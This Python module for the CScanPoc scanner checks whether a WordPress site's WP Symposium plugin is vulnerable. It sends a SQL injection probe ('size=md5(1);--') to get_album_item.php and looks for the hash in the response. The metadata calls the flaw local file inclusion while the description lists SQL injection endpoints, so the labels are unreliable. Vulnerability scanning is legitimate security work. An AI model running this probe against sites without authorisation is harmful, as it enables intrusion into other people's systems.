# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0032'  # 平台漏洞编号，留空
    name = 'WordPress plugins/wp-symposium 本地文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2015-06-08'  # 漏洞公布时间
    desc = '''
        WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
        WordPress WP Symposium插件存在多个输入验证漏洞，允许攻击者利用漏洞进行SQL注入攻击：
        通过"uid"参数提交给index.php的输入在用于SQL查询之前缺少过滤。
        多个脚本不正确过滤多个参数数据，可导致SQL注入攻击。受影响脚本包括：
        http://[host]/wp-content/plugins/wp-symposium/ajax/symposium_groups_functions.php?action=get_group_members&gid
        http://[host]/wp-content/plugins/wp-symposium/get_album_item.php?size
        http://[host]/wp-content/plugins/wp-symposium/ajax/symposium_forum_functions.php?action=updateEditDetails&tid
        http://[host]/wp-content/plugins/wp-symposium/ajax/symposium_forum_functions.php?action=updateEditDetails&topic_category
        http://[host]/wp-content/plugins/wp-symposium/ajax/symposium_profile_functions.php?action=addFriend&friend_to
    '''  # 漏洞描述
    ref = 'http://english.venustech.com.cn/NewsInfo/124/18173.Html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '69326e54-9a7b-4e38-ad4d-57f5a3ec1569'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/wp-content/plugins/wp-symposium/get_album_item.php?size=md5(1);--'
            verify_url = self.target + payload
            #code, head, res, errcode, _ = curl.curl(url)
            r = requests.get(verify_url)
            if r.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in r.text:
                # security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
